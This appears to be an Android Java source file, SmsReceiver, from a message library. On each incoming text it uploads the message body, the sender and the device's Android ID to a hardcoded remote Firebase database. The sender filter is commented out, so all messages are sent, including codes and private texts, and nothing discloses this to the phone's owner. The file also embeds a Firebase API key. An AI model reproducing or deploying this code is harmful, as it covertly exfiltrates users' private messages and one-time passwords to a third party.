package nowfloats.messagelibrary;

import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.support.v4.content.WakefulBroadcastReceiver;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.FirebaseOptions;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import static android.content.Context.POWER_SERVICE;

/**
 * Created by Admin on 01-02-2017.
 */

public class SmsReceiver extends WakefulBroadcastReceiver {

    private static String DATABASE_NAME="FpId_",MOBILE_ID,MESSAGES="messages",PHONE_IDS="phoneIds",DETAILS="details";
    private String[] selection={"WAYSMS","INDMRT","JustDl","Quikrr"};

    PowerManager.WakeLock wakeLock;
    PowerManager powerManager;
    @Override
    public void onReceive(final Context context, final Intent intent) {
        Log.v("ggg","on receive");

        MOBILE_ID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        powerManager = (PowerManager) context.getSystemService(POWER_SERVICE);

        new Thread(new Runnable() {
            @Override
            public void run() {
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                        "MyWakelockTag");
                if(!wakeLock.isHeld())
                    wakeLock.acquire();

                FirebaseOptions options = new FirebaseOptions.Builder()
                        .setApiKey("AIzaSyCZttwA-_904e5i5dt8B0ngzBdYBiZJ5Ek")
                        .setApplicationId("1:1062918210318:android:0b779b0abb2b1ef6")
                        .setDatabaseUrl("https://readmessage-37a5e.firebaseio.com")
                        .build();
                FirebaseApp secondApp = null;
                try {
                    secondApp = FirebaseApp.getInstance("second app");
                }catch(Exception e) {
                    secondApp = FirebaseApp.initializeApp(context, options, "second app");
                }
                FirebaseDatabase secondDatabase = FirebaseDatabase.getInstance(secondApp);
                DatabaseReference mDatabase = secondDatabase.getReference().child(DATABASE_NAME+MESSAGES).child(MOBILE_ID);

                MessageListModel.PhoneIds phoneIds=new MessageListModel.PhoneIds();
                phoneIds.setDate(String.valueOf(System.currentTimeMillis()));
                phoneIds.setPhoneId(MOBILE_ID);
                DatabaseReference phoneIdRef = mDatabase.child(DATABASE_NAME+DETAILS).child(PHONE_IDS);
                phoneIdRef.child(MOBILE_ID).setValue(phoneIds);

                SmsMessage[] sms = Telephony.Sms.Intents.getMessagesFromIntent(intent);
                MessageListModel.SmsMessage model;
                for (SmsMessage ms:sms) {
                    //for (String s:selection) {
                        //if (ms.getOriginatingAddress().contains(s)){
                            model =  MessageListModel.SmsMessage.getInstance()
                                    .setBody(ms.getMessageBody())
                                    .setSubject(ms.getOriginatingAddress())
                                    .setDate(System.currentTimeMillis());
                            Log.v("ggg","\n"+ms.getOriginatingAddress()+"\n"+ms.getProtocolIdentifier()
                                    +"\n"+ms.getTimestampMillis());

                            String key = mDatabase.push().getKey();
                            mDatabase.child(key).setValue(model);
                            //break;
                        ///}
                    //}

                }
                if(wakeLock.isHeld())
                    wakeLock.release();
            }
        }).start();

    }
    private void addListener(final DatabaseReference mDatabase, final SmsMessage[] sms){
        Log.v("ggg",sms.length+" length");
        new Thread(new Runnable() {
            @Override
            public void run() {
                MessageListModel.SmsMessage model;
                for (SmsMessage ms:sms) {
                    for (String s:selection) {
                        if (ms.getOriginatingAddress().contains(s)){
                            model =  MessageListModel.SmsMessage.getInstance()
                                    .setBody(ms.getMessageBody())
                                    .setSubject(ms.getOriginatingAddress())
                                    .setDate(System.currentTimeMillis());
                            Log.v("ggg","\n"+ms.getOriginatingAddress()+"\n"+ms.getProtocolIdentifier()
                                    +"\n"+ms.getTimestampMillis());

                            String key = mDatabase.push().getKey();
                            mDatabase.child(key).setValue(model);
                            break;
                        }
                    }

                }
            }
        }).start();

    }
}
